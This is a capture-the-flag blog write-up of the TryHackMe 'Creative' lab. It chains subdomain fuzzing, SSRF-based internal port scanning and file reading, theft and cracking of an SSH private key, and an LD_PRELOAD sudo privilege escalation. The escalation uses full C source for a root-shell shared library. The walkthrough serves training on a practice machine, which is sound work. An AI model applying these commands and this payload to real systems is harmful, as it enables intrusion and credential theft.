---
date: 2024-04-17T22:14:41-05:00
# description: ""
image: "/images/THM-Creative/Creative.svg"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Creative"
type: "post"
---

* Platform: TryHackMe
* Link: [Creative](https://tryhackme.com/r/room/creative)
* Level: Easy
* OS: Linux
---

The challenge begins with a static website that is unexploitable. Through subdomain enumeration, a URL testing application is uncovered, susceptible to SSRF. However, full exploitation is only possible after discovering an internally exposed port. This access allows for file reading on the server, leading to the retrieval of an SSH private key. Yet, this alone isn't enough to establish a foothold. Success is achieved by cracking the obtained SSH key's hash, granting access to the target system. Finally, privilege escalation is done by exploiting the `LD_PRELOAD` environment variable.

Target IP - `10.10.119.61`

## Scanning 

```
nmap -sC -sV -oA nmap/Creative 10.10.119.61
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 20:52 CDT
Nmap scan report for 10.10.119.61
Host is up (0.27s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.97 seconds
```

We have two ports open, 22 (SSH) and 80 (Nginx). We are redirected to `http://creative.thm`. 

```
sudo echo "10.10.119.61 creative.thm" | sudo tee -a /etc/hosts
```

## Enumeration

The website appears to be rather simple, without anything exploitable. 

Directory enumeration and source code review do not yield anything.

Using ffuf for subdomain enumeration we find `beta`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fc 404 -t 100 -u http://creative.thm -H "Host: FUZZ.creative.thm" -ic -fs 178
```

![Beta subdomain found](/images/THM-Creative/beta-subdomain.png)

After adding it to the `/etc/hosts` file, we visit it and it turns out to be a URL tester.

![URL tester website](/images/THM-Creative/beta-url-tester.png)

Submitting `http://127.0.0.1:80` brings back the content of the main page without the styling, hinting to SSRF.

![URL tester SSRF 1](/images/THM-Creative/url-test.png)

Trying `http://creative.thm/etc/passwd` does not work. and returns `Dead`.

![File read attempt failed](/images/THM-Creative/file-read-fail.png)

### SSRF Internal Port Scanning

Let's try to discover the internal open ports on the target.

```
ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded' -mc all -t 100 -fs 13
```

![Internal ports fuzzing](/images/THM-Creative/ffuf-cmd.png)

Port `1337` is discovered, by submitting `http://127.0.0.1:1337/` we are able to list the directories on the server.

![Directories on the server](/images/THM-Creative/server-directories.png)

In Burp we explore the file system and see what we can find. Let's go to `/home`.

![Home directory via SSRF](/images/THM-Creative/home-dir.png)

In `/home` we find a directory for `saad`. Going deeper with `http://127.0.0.1:1337/home/saad/` we discover the `.shh` folder and the user flag `user.txt`. 

Using `http://127.0.0.1:1337/home/saad/user.txt` will reveal the flag.

## Initial Foothold

By submitting `http://127.0.0.1:1337/home/saad/.ssh/id_rsa` we can grab the SSH key of the user.

![saad user SSH key](/images/THM-Creative/saad-ssh-key.png)

> Don't forget to set the correct permissions on the key with `chmod 600`.

Attempting to log in via SSH fails because we still need the passphrase of the user.

```
ssh saad@creative.thm -i id_rsa
```
![SSH login failed](/images/THM-Creative/ssh-fail.png)

We can use `john` to find the passphrase by converting the key into a crackable hash.

```
ssh2john id_rsa > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Hash cracking to recover passphrase](/images/THM-Creative/passphrase.png)

The passphrase is found and we can now login.

![Initial foothold via SSH login](/images/THM-Creative/foothold.png)

## Privilege Escalation

One of the things we should always check is the `.bash_history` file. It reveals the account password for `saad`.

![Account password recovered](/images/THM-Creative/system-password.png)

With that password we are able to run `sudo -l`. The user is able to run `/usr/bin/ping` as root.

![Sudo -l command](/images/THM-Creative/sudo-l.png)

There is not much we can do with `ping`. We could try to replace the binary with a malicious one if we had write permissions to `/usr/bin/` but that is not the case, all the files are owned by root.

![Ping binary permissions](/images/THM-Creative/ping-binary.png)

Our next lead is the environment variable `LD_PRELOAD`.

> The `env_keep+=LD_PRELOAD` entry in the sudo configuration suggests that `saad` is allowed to preserve the `LD_PRELOAD` environment variable when running sudo commands. This could potentially be leveraged for loading malicious shared libraries.


`LD_PRELOAD` is an environment variable in Linux and other Unix-like operating systems. It allows a user to specify a list of additional shared libraries to preload before all others when a program is executed.

A great article about `Linux Privilege Escalation using LD_Preload` is available [here](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/). 

1. We go to `/tmp` and create a `shell.c` file.

```
cd /tmp
nano shell.c 
```

Here is the content of my file, I modified the one from the article because I was having issues during the compilation.

```C
#include <stdio.h>
#include <unistd.h> // Include this header for setuid() and setgid() functions
#include <stdlib.h>

void _init() 
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

2. We compile and link `shell.c` into a shared library named `shell.so`

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![Shared library permissions](/images/THM-Creative/shared-library.png)

3. Finally we execute the `ping` command with the `LD_PRELOAD` environment variable set to `/tmp/shell.so` and we get to root.

```
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

![Privilege escalation and root flag](/images/THM-Creative/root-flag.png)

This was a pretty straightforward challenge, showing how one vulnerability can lead to an exploitation chain. The challenge also highlighted how misconfigurations can be used to an attacker's advantage. Until the next one, keep learning!
